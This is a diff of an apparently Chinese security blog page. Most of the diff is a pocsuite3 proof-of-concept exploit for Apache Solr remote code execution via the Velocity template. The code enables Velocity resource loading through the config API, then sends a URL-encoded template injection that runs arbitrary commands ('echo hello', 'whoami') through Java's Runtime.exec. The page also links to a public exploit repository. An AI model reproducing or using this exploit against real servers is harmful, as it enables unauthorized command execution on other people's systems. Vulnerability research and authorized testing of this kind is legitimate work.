@@ -434,14 +434,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        991
+                        1.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        5 分
+                        6 分
                     </div>
                     
                 
@@ -491,15 +491,57 @@
 &quot;&quot;&quot;
 import json
 from abc import ABC
+
 from pocsuite3.api import Output, POCBase, register_poc, requests, logger
 
 
 def get_core_name(url):
-    core_name = &quot;&quot;
     url += &quot;/solr/admin/cores?wt=json&amp;indexInfo=false&quot;
     res = requests.get(url, verify=False, timeout=30)
     core_name = list(json.loads(res.text)[&quot;status&quot;])[0]
     return core_name
+
+
+def update_config(path):
+    headers = {
+        &#39;User-Agent&#39;: &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; &quot;
+                      &quot;.NET CLR 2.0.50727)&quot;,
+        &#39;Content-Type&#39;: &#39;application/json&#39;
+    }
+    data = &quot;&quot;&quot;
+    {
+        &quot;update-queryresponsewriter&quot;: {
+            &quot;startup&quot;: &quot;lazy&quot;,
+            &quot;name&quot;: &quot;velocity&quot;,
+            &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,
+            &quot;template.base.dir&quot;: &quot;&quot;,
+            &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,
+            &quot;params.resource.loader.enabled&quot;: &quot;true&quot;
+        }
+    }
+    &quot;&quot;&quot;
+    res = requests.post(path, data=data, headers=headers, verify=False, timeout=30)
+    return res
+
+
+def send_payload(path, core_name, cmd):
+    headers = {
+        &#39;User-Agent&#39;: &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; &quot;
+                      &quot;.NET CLR 2.0.50727)&quot;
+    }
+    payload = path + &quot;/solr/&quot; + core_name + &quot;/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom&quot; \
+                                            &quot;=%23set(&quot; \
+                                            &quot;$x=%27%27)+%23set($rt=$x.class.forName(&quot; \
+                                            &quot;%27java.lang.Runtime%27))+%23set(&quot; \
+                                            &quot;$chr=$x.class.forName(%27java.lang.Character%27))+%23set(&quot; \
+                                            &quot;$str=$x.class.forName(&quot; \
+                                            &quot;%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(&quot; \
+                                            &quot;%27&quot; + cmd + &quot;%27))+$ex.waitFor(&quot; \
+                                                          &quot;)+%23set($out=$ex.getInputStream())+%23foreach($i+in+[&quot; \
+                                                          &quot;1..$out.available(&quot; \
+                                                          &quot;)])$str.valueOf($chr.toChars($out.read()))%23end&quot;
+    res = requests.get(payload, headers=headers, verify=False, timeout=30)
+    return res
 
 
 class DemoPOC(POCBase, ABC):
@@ -528,45 +570,29 @@ class DemoPOC(POCBase, ABC):
         # 验证代码
         result = {}
         core_name = get_core_name(self.url)
-        headers = {
-            &#39;User-Agent&#39;: &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; &quot;
-                          &quot;.NET CLR 2.0.50727)&quot;,
-            &#39;Content-Type&#39;: &#39;application/json&#39;
-        }
-        data = {
-            &quot;update-queryresponsewriter&quot;: {
-                &quot;startup&quot;: &quot;lazy&quot;,
-                &quot;name&quot;: &quot;velocity&quot;,
-                &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,
-                &quot;template.base.dir&quot;: &quot;&quot;,
-                &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,
-                &quot;params.resource.loader.enabled&quot;: &quot;true&quot;
-            }
-        }
 
         path = self.url + &quot;/solr/&quot; + core_name + &quot;/config&quot;
-        payload = self.url + &quot;/solr/&quot; + core_name + &quot;/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom&quot; \
-                                                    &quot;=%23set(&quot; \
-                                                    &quot;$x=%27%27)+%23set($rt=$x.class.forName(&quot; \
-                                                    &quot;%27java.lang.Runtime%27))+%23set(&quot; \
-                                                    &quot;$chr=$x.class.forName(%27java.lang.Character%27))+%23set(&quot; \
-                                                    &quot;$str=$x.class.forName(&quot; \
-                                                    &quot;%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(&quot; \
-                                                    &quot;%27echo hello%27))+$ex.waitFor(&quot; \
-                                                    &quot;)+%23set($out=$ex.getInputStream())+%23foreach($i+in+[&quot; \
-                                                    &quot;1..$out.available(&quot; \
-                                                    &quot;)])$str.valueOf($chr.toChars($out.read()))%23end &quot;
+        res = requests.get(path, verify=False, timeout=30)
+        if (&#39;&quot;solr.resource.loader.enabled&quot;:&quot;true&quot;&#39; not in res.text) or (
+                &#39;&quot;params.resource.loader.enabled&quot;:&quot;true&quot;&#39; not in res.text):
+            res = update_config(path)
+            if res.status_code != 200:
+                return self.parse_output(result)
 
-        res = requests.get(path, headers=headers, verify=False, timeout=30)
-        if &#39;&quot;solr.resource.loader.enabled&quot;:&quot;true&quot;&#39; not in res.text:
-            res = requests.post(path, data=data, headers=headers, verify=False, timeout=30)
-
-        res = requests.get(payload, verify=False, timeout=30)
+        cmd = &quot;echo hello&quot;
+        res = send_payload(self.url, core_name, cmd)
         # print(res.text)
-        if &quot;hello&quot; in res.text:  # result是返回结果
+        if res.status_code == 500:
+            cmd = &quot;whoami&quot;
+            res = send_payload(self.url, core_name, cmd)
+            if res.status_code == 200:
+                result[&#39;VerifyInfo&#39;] = {}
+                result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url
+                result[&#39;VerifyInfo&#39;][&#39;whoami&#39;] = res.text
+        elif &quot;hello&quot; in res.text and &quot;responseHeader&quot; not in res.text:  # result是返回结果
             result[&#39;VerifyInfo&#39;] = {}
             result[&#39;VerifyInfo&#39;][&#39;URL&#39;] = self.url
-            result[&#39;VerifyInfo&#39;][&#39;Info&#39;] = res.text
+            result[&#39;VerifyInfo&#39;][&#39;echo hello&#39;] = res.text
         return self.parse_output(result)
 
     def _attack(self):
@@ -583,7 +609,8 @@ class DemoPOC(POCBase, ABC):
 
 
 # 注册 DemoPOC 类
-register_poc(DemoPOC)</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template" target="_blank" rel="noopener">Apache_Solr_RCE_via_Velocity_template: Apache_Solr_RCE_via_Velocity_template</a></p>
+register_poc(DemoPOC)
+</code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://github.com/wyzxxz/Apache_Solr_RCE_via_Velocity_template" target="_blank" rel="noopener">Apache_Solr_RCE_via_Velocity_template: Apache_Solr_RCE_via_Velocity_template</a></p>
 
             </div>
             <hr/>
@@ -1308,7 +1335,7 @@ register_poc(DemoPOC)</code></pre><h1 id="参考文章"><a href="#参考文章" 
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">26.9k</span>
+                <span class="white-color">27k</span>
             
 
             
